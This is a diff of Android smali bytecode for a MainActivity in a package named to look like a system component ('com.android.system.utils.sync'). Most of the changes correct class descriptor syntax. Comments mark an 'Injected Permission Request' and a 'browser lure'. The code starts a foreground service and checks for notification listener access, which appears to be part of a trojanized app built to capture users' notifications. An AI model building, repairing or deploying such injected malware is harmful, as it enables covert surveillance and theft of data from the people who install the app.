@@ -1,4 +1,4 @@
-.class public Lcom.android.system.utils.sync/MainActivity;
+.class public Lcom/android/system/utils/sync/MainActivity;
 .super Landroid/app/Activity;
 .source "MainActivity.java"
 
@@ -17,7 +17,7 @@
     .locals 4
 
     .line 54
-    invoke-virtual {p0}, Lcom.android.system.utils.sync/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
+    invoke-virtual {p0}, Lcom/android/system/utils/sync/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
 
     move-result-object v0
 
@@ -34,7 +34,7 @@
 
     .line 57
     .local v1, "enabledNotificationListeners":Ljava/lang/String;
-    invoke-virtual {p0}, Lcom.android.system.utils.sync/MainActivity;->getPackageName()Ljava/lang/String;
+    invoke-virtual {p0}, Lcom/android/system/utils/sync/MainActivity;->getPackageName()Ljava/lang/String;
 
     move-result-object v2
 
@@ -69,7 +69,7 @@
     # Injected Permission Request
     # Check and Request Permissions for Android 14
     const-string v0, "android.permission.POST_NOTIFICATIONS"
-    invoke-virtual {p0, v0}, Lcom.android.system.utils.sync/MainActivity;->checkSelfPermission(Ljava/lang/String;)I
+    invoke-virtual {p0, v0}, Lcom/android/system/utils/sync/MainActivity;->checkSelfPermission(Ljava/lang/String;)I
     move-result v0
     if-eqz v0, :cond_request
 
@@ -91,7 +91,7 @@
 
     # Request code: 101
     const/16 v1, 0x65
-    invoke-virtual {p0, v0, v1}, Lcom.android.system.utils.sync/MainActivity;->requestPermissions([Ljava/lang/String;I)V
+    invoke-virtual {p0, v0, v1}, Lcom/android/system/utils/sync/MainActivity;->requestPermissions([Ljava/lang/String;I)V
 
     :cond_request
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
@@ -99,20 +99,20 @@
     .line 23
     const/high16 v0, 0x7f040000
 
-    invoke-virtual {p0, v0}, Lcom.android.system.utils.sync/MainActivity;->setContentView(I)V
+    invoke-virtual {p0, v0}, Lcom/android/system/utils/sync/MainActivity;->setContentView(I)V
 
     # 1. Start Service FIRST while in Foreground
     new-instance v0, Landroid/content/Intent;
-    const-class v1, Lcom.android.system.utils.sync/MainService;
+    const-class v1, Lcom/android/system/utils/sync/MainService;
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-    invoke-virtual {p0, v0}, Lcom.android.system.utils.sync/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p0, v0}, Lcom/android/system/utils/sync/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
 
     # 2. THEN open the browser lure
     # [Rest of the injection will handle this]
 
 
     .line 25
-    invoke-direct {p0}, Lcom.android.system.utils.sync/MainActivity;->isNotificationServiceRunning()Z
+    invoke-direct {p0}, Lcom/android/system/utils/sync/MainActivity;->isNotificationServiceRunning()Z
 
     move-result v0
 
@@ -121,7 +121,7 @@
     if-nez v0, :cond_0
 
     .line 28
-    invoke-virtual {p0}, Lcom.android.system.utils.sync/MainActivity;->getApplicationContext()Landroid/content/Context;
+    invoke-virtual {p0}, Lcom/android/system/utils/sync/MainActivity;->getApplicationContext()Landroid/content/Context;
 
     move-result-object v1
 
@@ -180,7 +180,7 @@
     .end local v5    # "v":Landroid/widget/TextView;
 
     :cond_0
-    # invoke-virtual {p0}, Lcom.android.system.utils.sync/MainActivity;->finish()V
+    # invoke-virtual {p0}, Lcom/android/system/utils/sync/MainActivity;->finish()V
 
     .line 49
     return-void
